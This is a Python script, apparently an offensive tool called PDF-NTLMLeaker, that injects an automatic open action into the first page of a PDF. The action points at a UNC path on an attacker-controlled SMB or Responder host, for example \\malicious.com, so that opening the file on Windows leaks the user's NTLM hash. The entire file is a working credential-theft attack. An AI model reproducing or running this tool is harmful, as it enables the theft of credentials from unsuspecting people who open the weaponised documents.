from pdfrw import PdfReader, PdfWriter, PdfDict, PdfName, PdfArray
import argparse

def get_args():
  parser = argparse.ArgumentParser( prog="PDF-NTLMLeaker.py",
                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                    epilog= '''
                    This script will inject a malicious metadata in a PDF file to force it leak the   
                    NTLM hash of any user that open that file in a Windows host.
                    ''')

  parser.add_argument("input", help="PDF file to be used as input.")
  parser.add_argument("path", help="UNC path of malicious SMB Server/Responder host (ex: \\\\malicious.com\\dumb_file.pdf)")
  parser.add_argument("-o", "--output", default="modified_file.pdf", help="Name of the output file. (default: modified_file.pdf)")
  args = parser.parse_args()
  return args

def add_payload(name, output, path):
    print( '[*] Reading PDF file: %s' % name)
    reader = PdfReader(name)
    print( '[*] Injecting the payload in the PDF file...')
    reader.pages[0].AA = PdfDict(
    	O=PdfDict(
    		F=r'%s' % path,
    		D=[0, PdfName('Fit')],
    		S=PdfName('GoToE')
    		)
    	)
    writer = PdfWriter()
    writer.addpages(reader.pages)
    print( '[*] Saving modified PDF as: %s' % output)
    writer.write(output)
    print( '[*] Done!')


def main():
  print ()
  print ('========================================================================')
  print ('|                         PDF-NTLMLeaker v0.1                          |')
  print ('|                               by pimps                               |')
  print ('========================================================================\n')

  args = get_args()

  add_payload(args.input.strip(),args.output.strip(), args.path.strip())

if __name__ == '__main__':
  main()
